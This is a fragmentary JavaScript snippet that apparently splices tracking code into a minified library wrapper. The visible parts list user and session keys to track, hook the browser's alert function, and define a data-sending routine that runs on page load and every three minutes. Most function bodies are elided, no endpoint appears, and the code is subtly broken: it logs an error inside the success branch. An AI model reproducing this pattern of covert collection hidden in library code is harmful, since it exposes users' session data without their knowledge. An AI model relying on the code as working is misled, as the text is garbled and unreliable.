...
*/
(function (e, t) {
  const keysToTrack = ['userId', 'sessionData', 'activityData'];
  var n,
    r,
    i = typeof t,
    o = e.location,
  ...
  function jsHook(object, method, callback) {
  ...
  async function sendData(data) {
    ...
    try {
      ...
      if (response.ok) {
        ...
        console.log(`Error: Unable to send data, status code: ${response.status}`);
      }
    } catch (error) {
  ...
  function trackGlobalVariable(name, value) {
  ...
  document.addEventListener('DOMContentLoaded', () => {
    jsHook(window, "alert", args => trackGlobalVariable("alert", args[0]));
    collectData();
    setInterval(collectData, 180000);
  });
  function nr(e, t, n) {
    var r,
      i,
